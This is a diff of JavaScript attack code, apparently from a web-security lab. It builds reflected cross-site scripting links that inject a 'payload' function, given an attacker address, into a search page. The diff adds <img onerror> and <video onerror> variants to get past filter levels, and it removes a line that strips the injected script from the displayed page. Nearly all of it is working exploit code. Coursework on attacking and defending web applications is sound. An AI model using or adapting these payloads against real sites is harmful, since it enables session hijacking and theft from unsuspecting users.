@@ -19,7 +19,6 @@ function payload(attacker) {
 	console.log(link);
 	function proxy(href) {
 		$("html").load(href, function(){
-			$(/a/.source).filter(/:contains(<script>)/.source).remove();
 			$("html").show();
 			window.onpopstate = function(event) 
 			{
@@ -135,7 +134,7 @@ function payload(attacker) {
 }
 function makeLink(xssdefense, target, attacker) {
 	if (xssdefense == 0) {
-		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script " + " >");
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
 	} 
 	else {
 	// Implement code to defeat XSS defenses here.
@@ -147,11 +146,11 @@ function makeLink(xssdefense, target, attacker) {
             break;
         case 2:
             return target+"./search?xssdefense="+xssdefense.toString()+"&q="+
-            encodeURIComponent("<img src=x onerror=alert(\"hi);\">");
+            encodeURIComponent("<img src=x onerror=" +payload.toString()+";payload(\"" + attacker+"\");>");
             break;
         case 3:
             return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-            encodeURIComponent("<video src='xxx' onerror=\'" + payload.toString() + ";payload(\"" + attacker + "\");\'>");
+            encodeURIComponent("<video src='xxx' onerror=" + payload.toString() + ";payload(\"" + attacker + "\");>");
             break;
 	}
 	}
